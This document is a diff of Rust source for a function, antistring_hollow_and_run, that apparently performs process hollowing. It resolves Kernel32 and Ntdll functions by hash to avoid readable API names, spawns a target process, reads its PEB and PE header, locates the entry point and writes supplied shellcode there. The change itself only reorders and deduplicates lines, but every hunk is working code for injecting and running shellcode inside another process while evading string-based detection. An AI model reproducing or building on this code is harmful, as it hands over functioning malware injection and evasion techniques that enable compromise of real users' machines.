@@ -146,11 +146,11 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
 
     // See line 30
     let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
+    let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION]; [BOOL]);
     let lp_command_line = PSTR(CString::new(target_process)
         .unwrap()
         .into_raw() as *mut u8
     );
-    let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION]; [BOOL]);
     unsafe { function(
         PCSTR::null(),
         lp_command_line,
@@ -166,9 +166,9 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
 
     // See line 55
     let function = rco_utils::find_function_address("Ntdll", 0x9b0d5adddbf90f8a).unwrap();
+    let function = rco_utils::construct_win32_function!(function; [HANDLE, PROCESSINFOCLASS, *mut c_void, u32, *mut u32]; [()]);
     let process_handle = process_information.hProcess;
     let mut basic_information = PROCESS_BASIC_INFORMATION::default();
-    let function = rco_utils::construct_win32_function!(function; [HANDLE, PROCESSINFOCLASS, *mut c_void, u32, *mut u32]; [()]);
     unsafe { function(
         process_handle,
         PROCESSINFOCLASS::default(),
@@ -179,9 +179,9 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
 
     // See line 72
     let function = rco_utils::find_function_address("Kernel32", 0x1c1cfbf71004cba8).unwrap();
+    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *mut c_void, usize, *mut usize]; [()]);
     let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
     let mut address_buffer = [0; POINTER_SIZE as usize];
-    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *mut c_void, usize, *mut usize]; [()]);
     unsafe { function(
         process_handle,
         image_base_address as *const c_void,
@@ -194,7 +194,6 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
     let mut header_buffer = [0_u8; 0x200];
     let head_pointer_raw = header_buffer.as_mut_ptr() as usize;
     let pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };
-    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *mut c_void, usize, *mut usize]; [()]);
     unsafe { function(
         process_handle,
         pe_base_address as *const c_void,
@@ -208,11 +207,11 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
 
     // See line 109
     let function = rco_utils::find_function_address("Kernel32", 0x2638fa76194bfe63).unwrap();
+    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *const c_void, usize, *mut usize]; [()]);
     let e_lfanew = unsafe { ptr::read((head_pointer_raw + E_LFANEW_OFFSET) as *const u32) };
     let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
     let entry_point_rva = unsafe { ptr::read((head_pointer_raw + opthdr_offset) as *const u32) };
     let entry_point_address = entry_point_rva as usize + pe_base_address;
-    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *const c_void, usize, *mut usize]; [()]);
     unsafe { function(
         process_handle,
         entry_point_address as *const c_void,
